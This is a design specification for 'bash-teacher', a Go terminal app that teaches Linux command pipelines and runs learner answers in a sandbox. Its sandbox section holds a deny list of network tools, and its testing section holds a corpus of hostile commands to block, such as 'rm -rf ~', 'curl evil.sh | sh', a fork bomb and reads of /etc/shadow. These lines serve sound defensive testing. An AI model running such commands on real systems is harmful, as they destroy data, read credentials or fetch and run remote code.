# bash-teacher — Specification

A terminal UI that teaches Linux/Unix commands and, above all, how to *compose* them
into pipelines. Three learning surfaces — a **Dictionary**, **Pipeline Exercises**, and
**Flashcards** — share one content library and one progress model.

- **Status:** draft v0.1
- **Binary name:** `bt`
- **Stack:** Go 1.22+ with Bubble Tea / Lipgloss / Bubbles
- **Distribution:** single static binary, content embedded via `go:embed`

---

## 1. Goals and non-goals

### Goals

1. Teach the ~80 commands that cover the overwhelming majority of real shell work,
   with their most-used flags — not exhaustive man pages.
2. Teach *composition*: the mental model of stdin → transform → stdout, and the
   recurring pipeline idioms (count-and-rank, filter-then-extract, find-and-act).
3. Build muscle memory through short, high-frequency recall drills with spaced
   repetition, so flags and idioms survive past the session.
4. Validate answers by **actually running them** against a fixture filesystem, so a
   learner is rewarded for any correct solution, not only the memorized one.
5. Work offline, install as one binary, and start in under 200 ms.

### Non-goals

- Not a shell replacement, not a man-page browser, not a general sandbox.
- Not a systems-administration course (no networking, systemd, or kernel material in v1).
- No account system, no telemetry, no network access of any kind at runtime.
- No Windows support in v1 (WSL is fine; native Windows is out of scope).

### Target learner

Someone who can `cd` and `ls` but freezes at `grep -rn ... | awk ... | sort | uniq -c`.
Secondary audience: an experienced user drilling flags they keep re-looking-up.

---

## 2. Product surfaces

The app opens on a **Home** screen showing today's review load, current streak, and
progress per topic, with four entries: Dictionary, Practice, Flashcards, Stats.

### 2.1 Dictionary

A searchable, browsable reference for every command in the library.

- **List pane (left):** commands grouped by category (Navigation, Inspection, Text
  Processing, Search, Streams & Redirection, Process Control, Archives, Permissions,
  Networking-lite). Fuzzy filter with `/`.
- **Detail pane (right):** for the selected command —
  - one-line summary and the "what it's *for*" sentence,
  - synopsis line,
  - a table of the flags worth knowing, each with a one-line gloss,
  - 3–6 worked examples, each with a caption explaining *why* you'd reach for it,
  - **"Plays well with"**: commands frequently piped before/after this one, each
    jumping to its own entry,
  - **"Seen in"**: links to the exercises and cards that use this command.
- **Actions:** `Enter` open detail, `p` practice an exercise using this command,
  `f` add this command's cards to the review queue, `y` copy an example to the clipboard.

Every dictionary entry is also reachable from anywhere with `?` (contextual lookup on
the command under the cursor in the exercise editor).

### 2.2 Pipeline exercises (Practice)

The core of the product. A task is stated in prose; the learner writes a pipeline; the
pipeline is executed in a sandbox against a fixture filesystem; stdout is compared with
the expected output.

Screen layout:

```
┌ Task 12/40 · Text Processing · ●●●○○ ────────────────────────────┐
│ Given access.log, print the 5 IP addresses with the most         │
│ requests, most frequent first, as "<count> <ip>".                │
├─ Fixture ────────────────────────────────────────────────────────┤
│ ~/work/access.log   (2.3 KB, 120 lines)   [tab to preview]       │
├─ Your pipeline ──────────────────────────────────────────────────┤
│ $ cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -5 │
├─ Output ─────────────────────────────────────────────────────────┤
│      31 10.0.0.7            ✓ matches expected                   │
│      22 10.0.0.4                                                 │
│      ...                                                         │
└ ^R run · ^H hint · ^S solution · ^N next · ? lookup ─────────────┘
```

Behaviour:

- **Editing** is a single-line editor with history (`↑`/`↓`), word motions, and
  command/flag completion drawn from the dictionary.
- **Run** (`Ctrl-R`) executes and diffs. The diff is line-oriented and shows the first
  mismatching line with a caret, not a wall of red.
- **Hints** are tiered and cost nothing but are recorded: (1) a nudge at the concept
  level ("you need to count duplicates"), (2) the shape of the pipeline with commands
  blanked (`_____ | sort | _____ -c | ...`), (3) the reference solution with commentary.
- **Alternative solutions accepted:** any pipeline producing the expected stdout passes.
  After passing, the reference solution is shown side-by-side with the learner's, with a
  note when theirs is longer or spawns more processes ("`grep -c` would have saved a
  `wc`").
- **Constraints** (optional, per exercise): an exercise may require or forbid specific
  commands (`must_use: [awk]`, `forbid: [grep]`) to force a technique. Violations fail
  with an explanatory message rather than an output diff.
- **Progression:** exercises are ordered into tracks; a track unlocks the next when 80%
  of its exercises pass. Free-roam browsing of any unlocked exercise is always allowed.

Exercise difficulty ladder (five levels): single command → command with flags →
two-stage pipe → three-or-more-stage pipe with a transform → real-world messy task
(quoting, field splitting, `xargs`, process substitution).

### 2.3 Flashcards

Short recall drills for muscle memory. Three card types:

| Type | Front | Back / answer | Graded by |
| --- | --- | --- | --- |
| `recall` | "Delete blank lines from a file" | `grep -v '^$' file` | typed answer, normalized match |
| `identify` | `sort -t: -k3 -n /etc/passwd` | "sort passwd numerically by 3rd colon-separated field" | self-graded (again/hard/good/easy) |
| `flag` | "`tar`: extract a gzipped archive verbosely" | `-xzvf` | typed answer, exact match |

- A session is a fixed-size queue (default 20 cards, configurable) built from cards due
  today plus new cards, capped by a daily new-card limit.
- Typed answers are normalized before comparison: whitespace collapsed, quote style
  (`'`/`"`) equivalent, flag order within a cluster equivalent (`-la` ≡ `-al` ≡ `-l -a`),
  short/long flags equivalent when documented as such in the dictionary. Anything
  ambiguous falls back to self-grading rather than a false negative.
- Grading is **FSRS-lite** (see §5). A wrong answer re-queues the card later in the same
  session.
- Timer optional; when enabled, a soft target (default 8 s) nudges toward automaticity
  but never fails a card on time alone.

### 2.4 Stats

Retention curve, cards due over the next 14 days, exercises passed per track,
per-command mastery (a heat grid over the dictionary), and current/longest streak.

---

## 3. Architecture

```
cmd/bt/main.go            entrypoint, flag parsing, TUI bootstrap
internal/tui/             Bubble Tea models: app, dictionary, practice, cards, stats
internal/content/         loader + validator for the YAML content library
internal/runner/          sandboxed execution, fixture materialization, diffing
internal/srs/             scheduler (FSRS-lite), review log
internal/store/           SQLite persistence (progress, review log, settings)
internal/shellparse/      pipeline tokenizer/AST used for safety checks and hints
content/                  the library itself (YAML + fixtures), embedded
```

- **One Bubble Tea program**, one root model, a `screen` enum switching between
  sub-models. Sub-models are independent `tea.Model`s so each is unit-testable headlessly
  by feeding `tea.KeyMsg`s and asserting on `View()`.
- **Execution is async**: `Ctrl-R` dispatches a `tea.Cmd` that runs the sandbox and
  returns a `runResultMsg`. The UI never blocks; a spinner shows after 150 ms.
- **Content is read-only at runtime**; all mutable state lives in SQLite at
  `$XDG_DATA_HOME/bash-teacher/progress.db` (falling back to `~/.local/share/...`).

---

## 4. Content model

Content is YAML, embedded at build time, and validated by `bt content lint` in CI.

### 4.1 Command entry

```yaml
# content/commands/sort.yaml
id: sort
name: sort
category: text
summary: Sort lines of text.
purpose: >
  Puts lines in order so that duplicates become adjacent — which is what makes
  `uniq` work — and so that "top N" questions become a `head` away.
synopsis: sort [OPTION]... [FILE]...
flags:
  - flag: "-n"
    gloss: Compare as numbers, not strings (so 9 sorts before 10).
  - flag: "-r"
    gloss: Reverse the result.
  - flag: "-k N[,M]"
    gloss: Sort by field N (through M), not the whole line.
  - flag: "-t CHAR"
    gloss: Use CHAR as the field separator instead of whitespace.
  - flag: "-u"
    gloss: Drop duplicate lines after sorting (like piping to `uniq`).
examples:
  - cmd: sort -rn counts.txt | head -5
    caption: The canonical "top 5" tail of a counting pipeline.
  - cmd: sort -t: -k3 -n /etc/passwd
    caption: Sort users by numeric UID, the third colon-separated field.
plays_well_with: [uniq, head, cut, awk, comm]
gotchas:
  - Plain `sort` is lexicographic — "10" comes before "9". Reach for `-n`.
  - "`sort | uniq` is not `sort -u` when you need `uniq -c` counts."
see_also: [uniq, comm, join]
```

### 4.2 Exercise

```yaml
# content/exercises/top-talkers.yaml
id: top-talkers
track: text-processing
level: 3
title: Top talkers in a log
prompt: >
  Using access.log, print the 5 IP addresses that made the most requests,
  most frequent first, formatted as the output of `uniq -c` (count then IP).
fixture: weblogs            # directory under content/fixtures/
expected_stdout_file: expected/top-talkers.txt
match: exact                # exact | trimmed | unordered | regex
teaches: [cut, sort, uniq, head]
must_use: []
forbid: []
reference_solution: cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -5
solution_notes: >
  The `sort | uniq -c | sort -rn` sandwich is the single most reusable idiom in
  shell text processing. Learn it as one unit.
hints:
  - You need to count how many times each value appears — which command counts
    adjacent duplicates, and what has to be true of the input first?
  - "_____ -d' ' -f1 access.log | sort | _____ -c | sort -__ | head -5"
```

### 4.3 Flashcard

```yaml
# content/cards/text.yaml
- id: card-grep-blank
  type: recall
  front: Remove blank lines from a file.
  back: grep -v '^$' file
  accepts:                  # additional accepted answers
    - "grep . file"
    - "sed '/^$/d' file"
  commands: [grep]
- id: card-tar-extract
  type: flag
  front: "`tar`: extract a gzipped archive, verbosely."
  back: "-xzvf"
  commands: [tar]
```

### 4.4 Fixtures

Each fixture is a directory under `content/fixtures/<name>/` containing plain files
only (no symlinks, no executables, nothing over 256 KB). It is copied into a fresh temp
directory before each run, so exercises are free to mutate it and never leak between
runs.

### 4.5 v1 content budget

- **80 commands** across 9 categories.
- **120 exercises**, roughly 20/25/30/25/20 across levels 1–5, in 6 tracks:
  Files & Navigation, Inspection, Text Processing, Search & Find, Streams &
  Redirection, Real-World Pipelines.
- **250 flashcards**, every one linked to at least one dictionary command.

---

## 5. Spaced repetition

FSRS-lite: each card carries `stability`, `difficulty`, `due`, `reps`, `lapses`.

- Ratings: `again` (1), `hard` (2), `good` (3), `easy` (4). Typed-answer cards map a
  correct answer to `good` by default; `hard`/`easy` are still reachable with `j`/`k`
  before advancing, and a wrong answer is `again`.
- Intervals grow from stability with a configurable `desired_retention` (default 0.90).
- `again` sets a 10-minute relearning step and increments `lapses`.
- Daily caps: `new_cards_per_day` (default 15), `max_reviews_per_day` (default 120).
- Passing an exercise credits every card in its `teaches` list with a half-strength
  `good` review — practice reinforces recall without double-counting it.
- The review log is append-only, so the scheduler can be swapped or re-simulated later
  without losing history.

---

## 6. Sandboxed execution

This is the security-critical component. Learner input is arbitrary shell text; it must
never be able to touch the real filesystem, the network, or long-running resources.

### 6.1 Pipeline

1. **Parse** the input with `internal/shellparse` into an AST of commands, arguments,
   pipes, and redirections. Reject on parse error with a friendly message.
2. **Static check** — reject before execution if the AST contains:
   - any command not on the **allowlist** (the set of commands in the dictionary, plus
     shell builtins `echo`, `printf`, `test`, `[`),
   - absolute paths outside the fixture root, or `..` escaping it,
   - `sudo`, `su`, `chmod +s`, `mount`, background jobs (`&`), `exec`,
   - network-capable commands (`curl`, `wget`, `nc`, `ssh`) — these are teachable in the
     dictionary but never executable,
   - command substitution or `eval` in v1 (revisit once the parser is proven).
3. **Materialize** the fixture into a fresh temp dir (`os.MkdirTemp`).
4. **Execute** under OS-level confinement (§6.2) with `sh -c`, `cwd` at the fixture root,
   a scrubbed environment (`PATH`, `HOME`, `LANG=C`, `TZ=UTC` only), stdin `/dev/null`.
5. **Limit**: 3 s wall clock (SIGKILL on expiry), 256 MB address space, 64 processes,
   1 MB captured stdout and stderr each (truncate with a notice), no core dumps.
6. **Compare** stdout to the expected output per the exercise's `match` mode.
7. **Tear down** the temp dir unconditionally, including on panic.

### 6.2 OS-level confinement

- **Linux:** `bubblewrap` when present — read-only bind of `/usr`, `/bin`, `/lib*`, a
  tmpfs `/tmp`, the fixture bind-mounted read-write, `--unshare-all`, `--die-with-parent`.
  Fall back to `unshare -Urnm` when `bwrap` is missing.
- **macOS:** `sandbox-exec` with a generated profile denying all by default, allowing
  `process-exec` and read on system paths, read/write only under the temp fixture root,
  and denying `network*`.
- **Neither available:** the static allowlist plus rlimits still apply, and the app shows
  a one-time banner: *"Running without OS sandbox — exercises execute with your normal
  user permissions."* A `--no-exec` mode disables execution entirely and falls back to
  answer matching for users who want zero execution.

The confinement layer is an interface (`runner.Sandbox`) with `bwrap`, `sandboxExec`, and
`bare` implementations selected once at startup and reported in `bt doctor`.

### 6.3 Output diffing

- `exact`: byte equality after trailing-newline normalization.
- `trimmed`: per-line trailing whitespace stripped.
- `unordered`: multiset of lines (for tasks where order is genuinely unspecified).
- `regex`: the expected file is a regex, for outputs containing timestamps or sizes.

Failures render as a two-column diff of the first 10 differing lines, with a
`column N` caret on the first mismatching character of the first bad line.

---

## 7. Interaction design

### 7.1 Global keys

| Key | Action |
| --- | --- |
| `?` | Contextual help / dictionary lookup for the word under the cursor |
| `Esc` | Back one level; from Home, quit prompt |
| `Ctrl-C` | Quit immediately |
| `1`–`4` | Jump to Dictionary / Practice / Flashcards / Stats |
| `/` | Filter or search within the current list |
| `Tab` | Cycle panes within a screen |

Vim-style `hjkl` navigation everywhere, with arrow keys as equivalents. Every screen
shows its own key legend in the footer; nothing is hidden behind undiscoverable chords.

### 7.2 Visual design

- Lipgloss theme with two palettes (dark default, light) chosen from `COLORFGBG` /
  `--theme`, plus `--no-color` and automatic degradation when `NO_COLOR` is set.
- Minimum usable terminal 80×24; layouts reflow above that. Below it, a single-pane
  fallback with a warning.
- Semantic color only: green pass, red fail, yellow hint-used, dim for chrome. Never
  color as the sole signal — pass/fail also carry `✓`/`✗`.

### 7.3 CLI surface

```
bt                      launch the TUI on Home
bt practice [track]     jump straight into practice
bt review               jump straight into the day's flashcards
bt dict <command>       print a dictionary entry to stdout and exit
bt stats                print a summary to stdout and exit
bt doctor               report sandbox backend, data dir, content version
bt content lint         validate the content library (used in CI)
bt export / bt import   dump/restore progress as JSON
```

---

## 8. Persistence

SQLite (`modernc.org/sqlite`, cgo-free) at `$XDG_DATA_HOME/bash-teacher/progress.db`.

```sql
CREATE TABLE cards       (id TEXT PRIMARY KEY, stability REAL, difficulty REAL,
                          due INTEGER, reps INTEGER, lapses INTEGER, last_review INTEGER);
CREATE TABLE reviews     (id INTEGER PRIMARY KEY, card_id TEXT, ts INTEGER,
                          rating INTEGER, elapsed_ms INTEGER, source TEXT);
CREATE TABLE attempts    (id INTEGER PRIMARY KEY, exercise_id TEXT, ts INTEGER,
                          input TEXT, passed INTEGER, hints_used INTEGER, ms INTEGER);
CREATE TABLE exercises   (id TEXT PRIMARY KEY, first_passed INTEGER, best_ms INTEGER,
                          attempts INTEGER);
CREATE TABLE meta        (key TEXT PRIMARY KEY, value TEXT);
```

Config is TOML at `$XDG_CONFIG_HOME/bash-teacher/config.toml` (theme, daily caps,
desired retention, session size, timer on/off, editor keybindings). Schema migrations are
numbered and forward-only; `attempts` is the raw record from which everything else can be
rebuilt.

---

## 9. Milestones

| Milestone | Contents | Exit criterion |
| --- | --- | --- |
| **M1 — Skeleton** | Bubble Tea shell, Home, screen routing, theme, content loader + linter | `bt` runs, navigates, loads content |
| **M2 — Dictionary** | Full dictionary UI, fuzzy search, 80 command entries | Every command entry passes lint and renders |
| **M3 — Runner** | Parser, allowlist, sandbox backends, diffing, `bt doctor` | Adversarial test suite (§10) fully blocked |
| **M4 — Practice** | Exercise UI, hints, alternative-solution acceptance, tracks, 120 exercises | Reference solution of every exercise passes in CI |
| **M5 — Flashcards** | Card UI, answer normalization, FSRS-lite, daily queue, 250 cards | Scheduler simulation matches expected intervals |
| **M6 — Polish** | Stats, export/import, light theme, packaging (Homebrew, `.deb`, GitHub releases) | Cold start under 200 ms; 80×24 clean |

---

## 10. Testing

- **Content:** `bt content lint` enforces schema, unique ids, resolvable cross-references,
  fixture existence and size limits. CI runs every exercise's `reference_solution` in the
  sandbox and asserts it produces `expected_stdout`, so content can never drift.
- **Runner (adversarial):** a fixed corpus that must all be rejected or contained —
  `rm -rf ~`, `cat /etc/shadow`, `curl evil.sh | sh`, `:(){ :|:& };:`, `cat ../../../etc/passwd`,
  `yes > /dev/full`, symlink escapes, a 10 GB allocation, an infinite loop. Runs on both
  Linux and macOS CI images, and again with the `bare` backend to confirm the static
  allowlist alone still blocks the command-level cases.
- **TUI:** golden-file tests over `View()` at 80×24 and 120×40 after scripted key
  sequences; `teatest` for the async run flow.
- **SRS:** deterministic simulation of a 365-day learner, asserting review load stays
  within caps and retention converges on the target.
- **Answer normalization:** table-driven equivalence tests, including the cases that must
  *not* be treated as equivalent (`-rn` vs `-r -n` is fine; `-i` vs `-I` is not).

---

## 11. Open questions

1. Should the dictionary ship man-page excerpts (licensing) or stay entirely hand-written?
   Current assumption: hand-written, which is also better pedagogy.
2. GNU vs BSD coreutils divergence (`sed -i`, `date`, `xargs -r`) — flag differences per
   platform in the dictionary, or standardize on GNU and require it? Leaning toward
   annotating differences and having `bt doctor` report which the machine has.
3. A "sandbox playground" mode (free-form pipeline against a chosen fixture, no task) —
   valuable, but it widens the runner's exposure. Deferred to post-v1.
4. User-authored content packs: the YAML schema is designed for it, but loading
   non-embedded content means loading untrusted `must_use`/`forbid` and fixture paths.
   Needs a trust model before it ships.
